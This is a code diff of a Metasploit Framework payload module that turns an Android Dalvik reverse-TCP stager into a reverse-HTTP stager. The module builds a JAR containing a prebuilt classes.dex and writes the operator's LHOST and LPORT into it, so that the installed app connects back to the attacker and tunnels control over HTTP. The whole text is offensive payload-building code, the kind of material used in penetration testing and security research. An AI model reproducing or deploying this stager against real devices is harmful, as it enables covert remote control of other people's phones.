@@ -2,13 +2,12 @@
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
-#	http://metasploit.com/
+#   http://metasploit.com/
 ##
+#thanks to @SheriefEldeeb for explaining reverse_http concept
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
+require 'msf/core/handler/reverse_http'
 
 module Metasploit3
 
@@ -17,27 +16,27 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'			=> 'Dalvik Reverse TCP Stager',
-			'Description'	=> 'Connect back stager',
-			'Author'		=> 'timwr',
-			'License'		=> MSF_LICENSE,
-			'Platform'		=> 'android',
-			'Arch'			=> ARCH_DALVIK,
-			'Handler'		=> Msf::Handler::ReverseTcp,
-			'Stager'		=> {'Payload' => ""}
-		))
-	end
-
-	def string_sub(data, placeholder, input)
+			'Name'          => 'Dalvik Reverse HTTP Stager',
+			'Description'   => 'Tunnel communication over HTTP',
+			'Author'        => 'anwarelmakrahy',
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'android',
+			'Arch'          => ARCH_DALVIK,
+			'Handler'       => Msf::Handler::ReverseHttp,
+			'Stager'        => {'Payload' => ""}
+			))
+  end 
+  
+  def string_sub(data, placeholder, input)
 		data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
 	end
-
+  
 	def generate_jar(opts={})
 		jar = Rex::Zip::Jar.new
 
 		classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
 
-		string_sub(classes, '127.0.0.1:M                     ', datastore['LHOST'].to_s + ":T") if datastore['LHOST']
+		string_sub(classes, '127.0.0.1:M                     ', datastore['LHOST'].to_s + ":H") if datastore['LHOST']
 		string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
 		jar.add_file("classes.dex", fix_dex_header(classes))
 
